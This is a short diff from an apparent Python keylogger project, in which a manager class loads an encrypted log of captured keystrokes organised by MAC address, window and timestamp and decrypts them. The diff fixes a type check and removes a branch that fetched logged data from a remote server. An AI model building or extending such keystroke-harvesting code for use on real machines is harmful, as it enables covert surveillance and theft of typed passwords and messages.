@@ -4,7 +4,7 @@ from KeyloggerAgent.KeyloggerService import KeyLoggerService
 from KeyloggerAgent.Encryption import XOREncryption
 from dotenv import load_dotenv
 import os
-import requests
+
 
 load_dotenv()
 password = os.environ.get('PASSWORD')
@@ -56,7 +56,7 @@ class KeyLoggerManager:
         Takes an encrypted json file
          and returns an unencrypted dictionary
         """
-        if self.writer is FileWriter:
+        if type(self.writer) is FileWriter:
             temp_dict = dict()
             data = self.writer.load('log.json')
             for mac, user_dict in data.items():
@@ -66,8 +66,7 @@ class KeyLoggerManager:
                     for timestamp, data_keys in data_dict.items():
                         temp_dict[mac][window][timestamp] = self.__encryption.decrypt(data_keys)
             return temp_dict
-        else:
-            return requests.get(f"http://{server_name}/api/get_data")
+
 
     @staticmethod
     def _writer(write:IWriter, data:dict, name:str):
